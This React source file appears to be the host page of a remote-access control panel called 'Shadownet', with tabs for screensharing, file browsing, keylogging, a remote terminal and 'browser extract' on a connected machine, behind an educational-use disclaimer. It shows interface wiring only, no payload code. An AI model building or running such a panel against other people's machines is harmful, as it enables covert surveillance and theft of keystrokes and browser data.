import { useEffect, useState, useRef } from "react";
import {
	Breadcrumb,
	BreadcrumbItem,
	BreadcrumbLink,
	BreadcrumbList,
	BreadcrumbPage,
	BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useDispatch, useSelector } from "react-redux";
import {
	startSocketTaskReset,
	stopSocketTaskReset,
} from "@/lib/slices/ShadownetSlices";
import { toast } from "sonner";
import System from "@/components/System";
import Agent from "@/components/Agent";
import Screenshare from "@/components/Screenshare";
import Explorer from "@/components/Explorer";
import Keylogger from "@/components/Keylogger";
import Terminal from "@/components/Terminal";
import Browser from "@/components/Browser";
import {
	AirplayIcon,
	ChromeIcon,
	FolderIcon,
	KeyboardIcon,
	PickaxeIcon,
	SettingsIcon,
	SquareTerminalIcon,
	TriangleAlertIcon,
} from "lucide-react";
import { useSearchParams } from "react-router-dom";
import Navbar from "@/components/Navbar";
import Container from "@/components/Container";

const Host = () => {
	
	const [searchParams, setSearchParams] = useSearchParams();

	const dispatch = useDispatch();

	const [hostId, setHostId] = useState(null);
	const [hostName, setHostName] = useState("");

	const [socketState, setSocketState] = useState(false);
	const [socketStream, setSocketStream] = useState(null);

	const [tabValue, setTabValue] = useState("disclaimer");

	const socketRef = useRef();

	const { success, isLoading, error } = useSelector(
		(response) => response.StartSocketTask
	);

	useEffect(() => {
		if (error) {
			toast.error(`Failed to fetch!`, {
				description: error,
				classNames: { error: "bg-red-400" },
			});
			dispatch(startSocketTaskReset());
			dispatch(stopSocketTaskReset());
		}
	}, [error]);

	useEffect(() => {
		setHostId(searchParams.get("id"));
		setHostName(searchParams.get("hostname"));

		socketRef.current = new WebSocket(
			`ws://${window.location.hostname}:8000/ws/shadownet/connect/client/`
		);
		socketRef.current.onopen = () => {
			setSocketState(true);
			console.log("WebSocket connected");
		};

		socketRef.current.onmessage = (event) => {
			const json_parsed = JSON.parse(event.data);
			setSocketStream(json_parsed.data);
		};

		socketRef.current.onclose = () => {
			setSocketState(false);
			console.log("WebSocket disconnected");
		};

		return () => {
			if (socketRef.current) {
				socketRef.current.close();
			}
		};
	}, []);

	useEffect(() => {
		if (tabValue === "terminal") {
			setSocketStream(null);
		}
	}, [tabValue]);

	useEffect(() => {
		if (hostName) {
			document.title = `Host: ${hostName}`;
		}
	}, [hostName]);

	return (
		<main>
			<Navbar />
			<Container className="mt-16">
				<Breadcrumb className="absolute top-10 z-40">
					<BreadcrumbList>
						<BreadcrumbItem>
							<BreadcrumbLink href="/dashboard">Home</BreadcrumbLink>
						</BreadcrumbItem>
						<BreadcrumbSeparator />
						<BreadcrumbItem>
							<BreadcrumbLink href="/dashboard">Hosts</BreadcrumbLink>
						</BreadcrumbItem>
						<BreadcrumbSeparator />
						<BreadcrumbItem>
							<BreadcrumbPage>{hostName}</BreadcrumbPage>
						</BreadcrumbItem>
					</BreadcrumbList>
				</Breadcrumb>

				<main className="w-full">
					<Tabs
						defaultValue="none"
						className="flex flex-col items-start gap-2 w-full"
						value={tabValue}
						onValueChange={(e) => setTabValue(e)}
					>
						<TabsList className="bg-muted-foreground/10 w-full items-center justify-start">
							<div className="w-full justify-start gap-1 p-1 flex-row lg:flex hidden">
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="disclaimer"
								>
									<div className="flex items-center gap-2">
										<TriangleAlertIcon size={16} className="mb-0.5" />
										<span>DISCLAIMER</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="system"
								>
									<div className="flex items-center gap-2">
										<SettingsIcon size={16} className="mb-0.5" />
										<span>SYSTEM</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="screenshare"
								>
									<div className="flex items-center gap-2">
										<AirplayIcon size={16} className="mb-0.5" />
										<span>SCREENSHARE</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="fileExplorer"
								>
									<div className="flex items-center gap-2">
										<FolderIcon size={16} className="mb-0.5" />
										<span>FILE EXPLORER</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="keylogger"
								>
									<div className="flex items-center gap-2">
										<KeyboardIcon size={16} className="mb-0.5" />
										<span>KEYLOGGER</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="terminal"
								>
									<div className="flex items-center gap-2">
										<SquareTerminalIcon size={16} className="mb-0.5" />
										<span>TERMINAL</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-48 hover:bg-background hover:text-foreground py-1"
									value="browser"
								>
									<div className="flex items-center gap-2">
										<ChromeIcon size={16} className="mb-0.5" />
										<span>BROWSER EXTRACT</span>
									</div>
								</TabsTrigger>
								<TabsTrigger
									className="w-full justify-start lg:justify-center lg:w-40 hover:bg-background hover:text-foreground py-1"
									value="agent"
								>
									<div className="flex items-center gap-2">
										<PickaxeIcon size={16} className="mb-0.5" />
										<span>AGENT</span>
									</div>
								</TabsTrigger>
							</div>
						</TabsList>
						<TabsContent value="disclaimer" className="w-full">
							<div className="w-full min-h-[70vh] flex flex-col items-center justify-center gap-6">
								<h1 className="text-2xl font-semibold">DISCLAIMER</h1>
								<p className="lg:w-3/6 w-full text-center leading-8 text-muted-foreground">
									This application is intended solely for educational purposes
									and is to be used exclusively on devices owned by the user.
									The developers and the &apos;fortyseven&apos; do not endorse
									or encourage hacking or any other illegal activities. Users
									are fully responsible for their actions, and any misuse of
									this application for illegal purposes is strictly prohibited.
									The developers and &apos;fortyseven&apos; disclaim all
									liability for any legal consequences resulting from the
									improper use of this application. Please use it responsibly
									and in accordance with all applicable laws.
								</p>
							</div>
						</TabsContent>
						<TabsContent value="system" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<System
									id={hostId}
									socketState={socketState}
									socketStream={socketStream}
									setSocketStream={setSocketStream}
									socketRef={socketRef}
								/>
							</div>
						</TabsContent>
						<TabsContent value="fileExplorer" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<Explorer
									id={hostId}
									socketState={socketState}
									socketStream={socketStream}
									setSocketStream={setSocketStream}
									socketRef={socketRef}
								/>
							</div>
						</TabsContent>
						<TabsContent value="terminal" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<Terminal
									id={hostId}
									socketState={socketState}
									socketStream={socketStream}
									setSocketStream={setSocketStream}
									socketRef={socketRef}
								/>
							</div>
						</TabsContent>
						<TabsContent value="browser" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<Browser
									id={hostId}
									socketState={socketState}
									socketStream={socketStream}
									setSocketStream={setSocketStream}
									socketRef={socketRef}
								/>
							</div>
						</TabsContent>
						<TabsContent value="screenshare" className="w-full">
						<div className="w-full flex flex-wrap gap-5">
							<Screenshare
								id={hostId}
								socketState={socketState}
								socketStream={socketStream}
								setSocketStream={setSocketStream}
								socketRef={socketRef}
							/>
						</div>
					</TabsContent>
						<TabsContent value="keylogger" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<Keylogger
									id={hostId}
									socketState={socketState}
									socketStream={socketStream}
									setSocketStream={setSocketStream}
									socketRef={socketRef}
								/>
							</div>
						</TabsContent>
						<TabsContent value="agent" className="w-full">
							<div className="w-full flex flex-wrap gap-5">
								<Agent id={hostId} />
							</div>
						</TabsContent>
					</Tabs>
				</main>
			</Container>
		</main>
	);
};

export default Host;
